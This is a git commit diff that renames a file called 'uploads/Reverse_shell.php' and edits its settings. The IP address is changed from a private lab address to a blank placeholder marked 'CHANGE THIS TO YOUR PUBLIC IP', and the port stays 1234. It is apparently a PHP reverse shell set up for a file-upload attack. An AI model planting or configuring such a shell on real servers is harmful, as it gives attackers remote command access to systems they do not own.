b005854da7f078d4a71d8f34e543697b5588fbc9
nigeltsz <50833955+nigeltsz@users.noreply.github.com>
2022-09-17 14:17:12 +0800

    Update and rename reverse_shell.PHP to Reverse_shell.php

--- uploads/Reverse_shell.php
+++ uploads/Reverse_shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.32.129';  // CHANGE THIS
+$ip = '';  // CHANGE THIS TO YOUR PUBLIC IP
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
